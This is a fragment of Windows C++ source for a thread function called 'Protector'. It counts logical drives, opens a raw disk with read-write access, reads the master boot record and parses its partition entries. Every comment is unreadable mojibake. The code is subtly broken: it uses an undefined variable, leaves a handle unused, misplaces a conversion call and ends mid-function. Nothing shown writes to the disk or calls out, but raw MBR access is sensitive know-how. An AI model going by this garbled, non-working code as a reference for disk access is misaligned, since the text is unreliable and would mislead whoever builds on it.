#include "Main.h"

ThreadFunction(Protector)
{
	unsigned int DiskCount = 0;
	DWORD DiskInfo = GetLogicalDrives(); //��ȡϵͳ���߼����������������������ص���һ��32λ�޷����������ݡ�
	while (DiskInfo)//ͨ��ѭ�������鿴ÿһλ�����Ƿ�Ϊ1�����Ϊ1�����Ϊ��,���Ϊ0����̲����ڡ�
	{
		if (DiskInfo & 1)//ͨ��λ������߼���������ж��Ƿ�Ϊ1
		{
			++DiskCount;
		}
		DiskInfo = DiskInfo >> 1;//ͨ��λ��������Ʋ�����֤ÿѭ��һ��������λ�������ƶ�һλ��
	}

	unsigned char MBR[MBR_SIZE]{ 0 };
	DWORD ReadSize = 0;
	HANDLE hDisk = CreateFile((TEXT*)lpParam, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	SetFilePointer(hDisk, 0, 0, FILE_BEGIN);
	ReadFile(hDisk, MBR, MBR_SIZE, &ReadSize, NULL);

	EOP Size;
	for (unsigned int n = 0; n < 4; n++)
	{
		for (int i = 0; i < 4; i++)
		{
			Size.Part[n].c[i] = MBR[457 + 16 * n - i];
			Size.Part[n].l = HextoDec(Size.Part[n].c, sizeof(Size.Part[n].c));
		}
	}

	wTEXT Volume[MAX_PATH];				//Device
	DWORD Junk;
	wTEXT Path[MAX_PATH];			//C:
	wTEXT FullName[MAX_PATH];
	HANDLE hFind = FindFirstVolume(Volume, MAX_PATH);
	GetVolumePathNamesForVolumeName(Volume, Path, sizeof(Path), &Junk);
	FullName[0] = '\\';
	FullName[1] = '\\';
	FullName[2] = '.';
	FullName[3] = '\\';
	FullName[4] = Temp[0];
	FullName[5] = ':';
	FullName[6] = 0;
}